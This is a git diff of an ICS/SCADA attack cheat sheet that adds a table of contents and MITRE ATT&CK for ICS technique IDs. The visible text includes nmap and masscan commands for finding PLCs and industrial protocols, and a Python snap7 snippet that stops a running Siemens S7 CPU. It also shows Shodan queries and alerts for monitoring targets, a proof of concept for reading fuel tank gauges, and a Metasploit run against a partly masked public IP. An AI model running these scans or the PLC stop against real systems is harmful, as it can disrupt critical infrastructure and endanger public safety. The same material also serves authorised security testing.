@@ -1,6 +1,33 @@
-# :mechanical_arm:  ICS/SCADA Enumeration Techniques for Effective Scanning, Network Reconnaissance, and Tactical Host Probing
+# ICS/SCADA Enumeration Techniques
 
-## General Enumeration
+## Table of Contents
+
+- [General Enumeration](#general-enumeration) - T0846
+- [Siemens S7](#siemens-s7) - T0846
+- [Stopping S7 CPUs with Python](#stopping-s7-cpus-with-python) - T0816
+- [Modbus Scanning](#modbus-scanning) - T0846
+- [Bacnet](#bacnet) - T0846
+- [Enip](#enip) - T0846
+- [Niagara fOX](#niagara-fox) - T0846
+- [Omron](#omron) - T0846
+- [PCWorx Devices](#pcworx-devices) - T0846
+- [Shodan.io Queries](#shodanio-queries) - T0883
+  - [Common ICS Devices](#common-ics-devices)
+  - [PLCs](#plcs)
+  - [Maritime](#maritime)
+  - [Miscellaneous](#miscellaneous)
+  - [Exposed DICOM Servers](#exposed-dicom-servers)
+  - [Zyxel Firewall Vulnerability](#zyxel-firewall-unauthenticated-remote-command-injection)
+  - [SDT-CW3B1 Command Injection](#sdt-cw3b1-11---os-command-injection-cve-2021-46422)
+  - [Setting Up Shodan for Target Monitoring](#setting-up-shodan-for-target-monitoring)
+- [ICS Common File Extensions](#ics-common-file-extensions) - T1083
+- [Automated Tank Gauge (ATG) Remote Configuration Disclosure](#automated-tank-gauge-atg-remote-configuration-disclosure) - T0801
+- [Access Moxa Devices](#access-moxa-devices) - T0846
+- [MQTT Enumeration](#mqtt-enumeration) - T0883
+
+---
+
+## General Enumeration (T0846)
 
 ```bash
 nmap -Pn -sT --scan-delay 1s --max-parallelism 1 \
@@ -9,7 +36,7 @@ nmap -Pn -sT --scan-delay 1s --max-parallelism 1 \
     <target>
 ```
 
-## Siemens S7
+## Siemens S7 (T0846)
 
 Enumerates Siemens S7 PLC Devices and collects their device information. This script is based off PLCScan that was developed by Positive Research and Scadastrangelove (<https://code.google.com/p/plcscan/>). This script is meant to provide the same functionality as PLCScan inside of Nmap. Some of the information that is collected by PLCScan was not ported over; this information can be parsed out of the packets that are received.
 
@@ -39,7 +66,7 @@ For scalable scanning and reconnaissance, utilize masscan for faster enumeration
 masscan <IP Range> -p 102 -oL Possible_ICS.txt; cat Possible_ICS.txt | while read LINE; do nmap --script s7-info.nse -p 102 $(awk '{print $4}'); done
 ```
 
-## Stopping S7 CPUs with Python
+## Stopping S7 CPUs with Python (T0816)
 
 ```python
 import snap7
@@ -53,7 +80,7 @@ if cpu_state == "S7CpuStatusRun":
     client.plc_stop()
 ```
 
-## Modbus Scanning
+## Modbus Scanning (T0846)
 
 ```bash
 nmap -Pn -sT -p502 --script modbus-discover <target>
@@ -61,7 +88,7 @@ nmap -Pn -sT -p502 --script modbus-discover <target>
 nmap -sT -Pn -p502 --script modbus-discover --script-args modbus-discover.aggressive=true <target>
 ```
 
-## Bacnet
+## Bacnet (T0846)
 
 ```bash
 nmap -Pn -sU -p47808 --script bacnet-info <target>
@@ -71,25 +98,25 @@ nmap -Pn -sU -p47808 --script bacnet-info <target>
 nmap -Pn -sT -n -T4 -p5033 <target>
 ```
 
-## Enip
+## Enip (T0846)
 
 ```nmap -Pn -sU -p44818 --script enip-info <target>```
 
-## Niagara fOX
+## Niagara fOX (T0846)
 
 ```nmap -Pn -sT -p1911,4911 --script fox-info <target>```
 
-## Omron
+## Omron (T0846)
 
 ```nmap -Pn -sU -p9600 --script omrom-info <target>```
 
-## PCWorx Devices
+## PCWorx Devices (T0846)
 
 PCWorx devices allow unaunthenticated requests that query for system information.
 
 ```nmap -Pn -sT -p1962 --script pcworx-info <target>```
 
-# Shodan.io Queries
+# Shodan.io Queries (T0883)
 
 ## Common ICS Devices
 
@@ -367,7 +394,7 @@ root@RoseSecurity# shodan alert enable 34W09AETJKAHEDPX any
 Successfully enabled Trigger: any
 ```
 
-## ICS Common File Extensions
+## ICS Common File Extensions (T1083)
 
 Python script to search for common ICS file extensions
 
@@ -472,7 +499,7 @@ for root, dirs, files in os.walk(ics_path):
 
 ```
 
-## Automated Tank Gauge (ATG) Remote Configuration Disclosure
+## Automated Tank Gauge (ATG) Remote Configuration Disclosure (T0801)
 
 In 2015, HD Moore, the creator of Metasploit, published an article disclosing over 5,800 gas station Automated Tank Gauges (ATGs) which were publicly accessible. Besides monitoring for leakage, these systems are also instrumental in gauging fluid levels, tank temperature, and can alert operators when tank volumes are too high or have reached a critical low. ATGs are utilized by nearly every fueling station in the United States and tens of thousands of systems internationally. They are most commonly manufactured by Veeder-Root, a supplier of fuel dispensers, payment systems, and forecourt merchandising. For remote monitoring of these fuel systems, operators will commonly configure the ATG serial interface to an internet-facing TCP port (generally set to TCP 10001). This script reads the Get In-Tank Inventory Report from TCP/10001 as a proof of concept to demonstrate the arbitrary access.
 
@@ -508,7 +535,7 @@ Video PoC:
 
 <https://www.youtube.com/watch?v=HkO4cs95erU&t=818s>
 
-## Access Moxa Devices
+## Access Moxa Devices (T0846)
 
 SCADA system that uses Moxa brand products to establish connectivity and communication with industrial devices that are being monitored and controlled in a critical infrastructure or industrial process.
 
@@ -528,7 +555,7 @@ set rhosts 212.x.x.14
 run
 ```
 
-## MQTT Enumeration
+## MQTT Enumeration (T0883)
 
 MQTT is a lightweight messaging protocol often used in IoT (Internet of Things) applications.
 
